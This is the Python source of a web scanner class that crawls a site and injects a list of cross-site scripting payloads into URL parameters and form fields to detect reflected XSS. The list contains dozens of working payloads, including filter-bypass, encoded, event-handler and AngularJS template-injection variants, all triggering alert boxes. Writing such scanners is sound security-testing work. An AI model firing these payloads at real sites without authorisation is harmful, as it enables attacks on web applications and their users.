"""
Cross-Site Scripting (XSS) scanner module.

Tests for reflected and stored XSS vulnerabilities by injecting payloads
and analyzing responses.
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import re

class XSSScanner:
    """Scanner for detecting Cross-Site Scripting vulnerabilities."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the XSS scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Request timeout in seconds
            depth (int): Scan depth level
            user_agent (str): User-Agent string to use in requests
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.depth = depth
        self.headers = {'User-Agent': user_agent}
        self.logger = logger
        self.verbose = verbose
        
        # XSS payloads to test - expanded with advanced techniques
        self.payloads = [
            # Basic XSS payloads
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            
            # Context breaking
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "';alert('XSS')//",
            "\";alert('XSS')//",
            
            # Tag attribute injections
            "\" onmouseover=\"alert('XSS')\" \"",
            "' onmouseover='alert(\"XSS\")' '",
            "\" autofocus onfocus=\"alert('XSS')\"",
            "'; onmouseover=alert('XSS') //",
            
            # Case variations to bypass filters
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<sCrIpT>alert('XSS')</sCrIpT>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            
            # HTML-encoded payloads
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
            
            # URL-encoded payloads
            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
            "%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",
            
            # DOM XSS vector attempts
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "><script>alert('XSS')</script>",
            
            # Malformed tags
            "<script/x>alert('XSS')</script>",
            "<script\x20type=\"text/javascript\">alert('XSS');</script>",
            "<script\x3Ealert('XSS');</script>",
            "<script\x0Dalert('XSS');</script>",
            "<script\x0Aalert('XSS');</script>",
            "<script\x0Calert('XSS');</script>",
            "<script\x00>alert('XSS');</script>",
            
            # Non-script event handlers
            "<img src=x onerror=alert('XSS')>",
            "<input type=\"text\" onfocus=\"alert('XSS')\" autofocus>",
            "<input onblur=alert('XSS') autofocus><input autofocus>",
            "<select onchange=alert('XSS')><option>1</option><option>2</option></select>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<details open ontoggle=\"alert('XSS')\">",
            "<audio src=x onerror=alert('XSS')>",
            "<marquee onstart=\"alert('XSS')\">",
            "<video src=x onerror=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<object onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
            "<title onpropertychange=alert('XSS')>",
            "<iframe onload=alert('XSS')>",
            "<form oninput=alert('XSS')><input></form>",
            
            # Javascript schemes
            "<a href=\"javascript:alert('XSS')\">Click me</a>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<object data=\"javascript:alert('XSS')\"></object>",
            "<embed src=\"javascript:alert('XSS')\">",
            "<div style=\"background-image: url(javascript:alert('XSS'))\">",
            "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">Click me</a>",
            
            # Advanced vectors with exotic elements
            "<math><maction actiontype=\"statusline#\" xlink:href=\"javascript:alert('XSS')\">Click me</maction></math>",
            "<table background=\"javascript:alert('XSS')\"></table>",
            "<math href=\"javascript:alert('XSS')\">CLICKME</math>",
            
            # Bypass techniques for WAFs and filters
            "javascript://%0Aalert('XSS')",
            "javascript://%0Dalert('XSS')",
            "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */alert('XSS'))//",
            "javascript:alert(String.fromCharCode(88,83,83))",
            "1\"onmouseover=alert('XSS');//",
            "alert`XSS`",
            
            # AngularJS specific
            "{{constructor.constructor('alert(\"XSS\")')()}}",
            "{{[].pop.constructor('alert(\"XSS\")')()}}",
            "<div ng-app ng-csp><div ng-click=$event.view.alert('XSS')>Click me</div></div>",
            
            # jQuery specific
            "<div id=\"</script><svg onload=alert('XSS')>\">"
        ]
    
    def _extract_forms(self, url):
        """
        Extract all forms from a URL.
        
        Args:
            url (str): The URL to extract forms from
            
        Returns:
            list: List of dictionaries containing form details
        """
        try:
            response = requests.get(url, headers=self.headers, timeout=self.timeout)
            if response.status_code != 200:
                return []
                
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_details = {}
                action = form.get('action', '')
                form_details['action'] = urljoin(url, action) if action else url
                form_details['method'] = form.get('method', 'get').lower()
                form_details['inputs'] = []
                
                for input_tag in form.find_all(['input', 'textarea']):
                    input_type = input_tag.get('type', 'text')
                    input_name = input_tag.get('name')
                    input_value = input_tag.get('value', '')
                    
                    if input_name:  # Only include inputs with names
                        form_details['inputs'].append({
                            'type': input_type,
                            'name': input_name,
                            'value': input_value
                        })
                
                forms.append(form_details)
            
            return forms
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error extracting forms from {url}: {str(e)}")
            return []
    
    def _extract_parameters(self, url):
        """
        Extract GET parameters from a URL.
        
        Args:
            url (str): The URL to extract parameters from
            
        Returns:
            dict: Dictionary of parameters and values
        """
        parsed_url = urlparse(url)
        return parse_qs(parsed_url.query)
    
    def _extract_links(self, url):
        """
        Extract all links from a URL.
        
        Args:
            url (str): The URL to extract links from
            
        Returns:
            list: List of links found
        """
        try:
            response = requests.get(url, headers=self.headers, timeout=self.timeout)
            if response.status_code != 200:
                return []
                
            soup = BeautifulSoup(response.text, 'html.parser')
            base_url = urlparse(url).scheme + "://" + urlparse(url).netloc
            links = []
            
            for a_tag in soup.find_all('a', href=True):
                href = a_tag['href']
                full_url = urljoin(url, href)
                
                # Only include links from the same domain
                if urlparse(full_url).netloc == urlparse(url).netloc:
                    links.append(full_url)
            
            return links
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error extracting links from {url}: {str(e)}")
            return []
    
    def _scan_get_parameters(self, url):
        """
        Test URL GET parameters for XSS vulnerabilities.
        
        Args:
            url (str): The URL to test
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        parameters = self._extract_parameters(url)
        if not parameters:
            return vulnerabilities
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing GET parameters in URL: {url}")
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        for param_name, param_values in parameters.items():
            for payload in self.payloads:
                test_url = f"{base_url}?{param_name}={payload}"
                
                # Add other parameters back
                for p_name, p_values in parameters.items():
                    if p_name != param_name:
                        test_url += f"&{p_name}={p_values[0]}"
                
                try:
                    if self.verbose and self.logger:
                        self.logger.info(f"Testing payload on parameter '{param_name}': {payload}")
                    
                    response = requests.get(
                        test_url, 
                        headers=self.headers, 
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                    
                    # Check if the payload is reflected in the response
                    if self._is_xss_successful(response.text, payload):
                        detail = f"Parameter '{param_name}' is vulnerable to XSS using payload: {payload}"
                        vulnerability = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'url': url,
                            'method': 'GET',
                            'parameter': param_name,
                            'payload': payload,
                            'details': detail,
                            'severity': 'High'
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"XSS found: {detail}")
                        
                        # No need to test more payloads for this parameter
                        break
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error testing GET parameter '{param_name}': {str(e)}")
        
        return vulnerabilities
    
    def _scan_form(self, form_details, url):
        """
        Test a form for XSS vulnerabilities.
        
        Args:
            form_details (dict): Form details including inputs
            url (str): The URL containing the form
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        if not form_details['inputs']:
            return vulnerabilities
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing form on URL: {url}, Action: {form_details['action']}")
        
        for payload in self.payloads:
            # We'll test each input field one by one
            for input_field in form_details['inputs']:
                # Skip non-text inputs (checkboxes, submit buttons, etc.)
                if input_field['type'] not in ['text', 'search', 'email', 'url', 'password', 'hidden', '', 'textarea']:
                    continue
                
                # Prepare data for the form submission
                data = {}
                for input_tag in form_details['inputs']:
                    if input_tag['name'] == input_field['name']:
                        data[input_tag['name']] = payload
                    elif input_tag['type'] != 'submit':  # Handle other non-submit inputs
                        data[input_tag['name']] = input_tag['value']
                
                if self.verbose and self.logger:
                    self.logger.info(f"Testing form field '{input_field['name']}' with payload: {payload}")
                
                try:
                    if form_details['method'] == 'post':
                        response = requests.post(
                            form_details['action'],
                            data=data,
                            headers=self.headers,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    else:  # GET
                        response = requests.get(
                            form_details['action'],
                            params=data,
                            headers=self.headers,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    
                    # Check if the payload is reflected in the response
                    if self._is_xss_successful(response.text, payload):
                        detail = f"Form field '{input_field['name']}' is vulnerable to XSS using payload: {payload}"
                        vulnerability = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'url': url,
                            'method': form_details['method'].upper(),
                            'form_action': form_details['action'],
                            'parameter': input_field['name'],
                            'payload': payload,
                            'details': detail,
                            'severity': 'High'
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"XSS found: {detail}")
                        
                        # No need to test more payloads for this field
                        break
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error testing form field '{input_field['name']}': {str(e)}")
        
        return vulnerabilities
    
    def _is_xss_successful(self, response_content, payload):
        """
        Check if XSS payload was successfully injected using multiple detection methods.
        
        Args:
            response_content (str): The response content to check
            payload (str): The XSS payload that was injected
            
        Returns:
            bool: True if XSS is successful, False otherwise
        """
        # Simple reflection check - check if the payload is reflected in the response
        if payload in response_content:
            # Now analyze the context of the reflection to determine if it's executable
            return self._can_escape_context(response_content, payload)
            
        # Check for HTML-encoded versions of the payload
        html_encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
        if html_encoded in response_content:
            # If we find the HTML-encoded version, it's likely not executable XSS
            return False
        
        # Check for URL-encoded versions (this might be reflected but not be executable)
        from urllib.parse import quote
        url_encoded = quote(payload)
        if url_encoded in response_content and not payload in response_content:
            return False
            
        # Advanced check for script injections
        if "<script" in payload.lower():
            # Look for script tags with our payload content
            script_content = payload.split("<script")[1].split(">")[1].split("</script")[0].strip()
            if script_content:
                soup = BeautifulSoup(response_content, 'html.parser')
                for script in soup.find_all('script'):
                    if script_content in script.text:
                        return True
        
        # Check for event handlers in attributes
        if "on" in payload.lower() and "=" in payload:
            # Extract the event handler
            event_handler_match = re.search(r'on\w+\s*=\s*["\']([^"\']+)["\']', payload, re.IGNORECASE)
            if event_handler_match:
                event_content = event_handler_match.group(1)
                # Search for this content in any attribute
                soup = BeautifulSoup(response_content, 'html.parser')
                for tag in soup.find_all():
                    for attr, value in tag.attrs.items():
                        if attr.lower().startswith('on') and event_content in value:
                            return True
        
        # Check for javascript: scheme injections 
        if "javascript:" in payload.lower():
            js_content = payload.split("javascript:")[1].strip()
            soup = BeautifulSoup(response_content, 'html.parser')
            for tag in soup.find_all(['a', 'iframe', 'frame', 'embed', 'object']):
                if tag.has_attr('src') and "javascript:" in tag['src'].lower() and js_content in tag['src']:
                    return True
                if tag.has_attr('href') and "javascript:" in tag['href'].lower() and js_content in tag['href']:
                    return True
        
        return False
    
    def _can_escape_context(self, response_content, payload):
        """
        Check if payload can escape the current context.
        
        Args:
            response_content (str): The response content to check
            payload (str): The XSS payload that was injected
            
        Returns:
            bool: True if payload can escape context, False otherwise
        """
        # Look for payload in dangerous contexts (simplified)
        soup = BeautifulSoup(response_content, 'html.parser')
        
        # Check if payload is in script tag
        for script in soup.find_all('script'):
            if payload in script.text:
                return True
        
        # Check if payload is in attribute values
        for tag in soup.find_all():
            for attr, value in tag.attrs.items():
                if isinstance(value, str) and payload in value:
                    return True
        
        # Check if payload is directly in HTML
        if re.search(re.escape(payload), str(soup), re.IGNORECASE):
            return True
        
        return False
    
    def scan(self):
        """
        Start the XSS vulnerability scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting XSS scan on {self.target_url}")
        
        # Test GET parameters in the main URL
        vulnerabilities.extend(self._scan_get_parameters(self.target_url))
        
        # Extract and test forms
        forms = self._extract_forms(self.target_url)
        for form in forms:
            vulnerabilities.extend(self._scan_form(form, self.target_url))
        
        # If depth > 1, crawl the site and test additional pages
        if self.depth > 1 and self.logger:
            self.logger.info(f"Crawling for additional links (depth: {self.depth})")
            
            # Simple crawling implementation (limited for brevity)
            links_to_visit = self._extract_links(self.target_url)
            visited_links = {self.target_url}
            
            current_depth = 1
            while current_depth < self.depth and links_to_visit:
                new_links = []
                
                for link in links_to_visit:
                    if link not in visited_links:
                        visited_links.add(link)
                        
                        # Test GET parameters in this link
                        vulnerabilities.extend(self._scan_get_parameters(link))
                        
                        # Extract and test forms in this link
                        link_forms = self._extract_forms(link)
                        for form in link_forms:
                            vulnerabilities.extend(self._scan_form(form, link))
                        
                        # Extract new links for the next depth level
                        if current_depth + 1 < self.depth:
                            new_links.extend([l for l in self._extract_links(link) if l not in visited_links])
                
                links_to_visit = new_links
                current_depth += 1
        
        if self.logger:
            self.logger.info(f"XSS scan completed. Found {len(vulnerabilities)} vulnerabilities.")
        
        return vulnerabilities
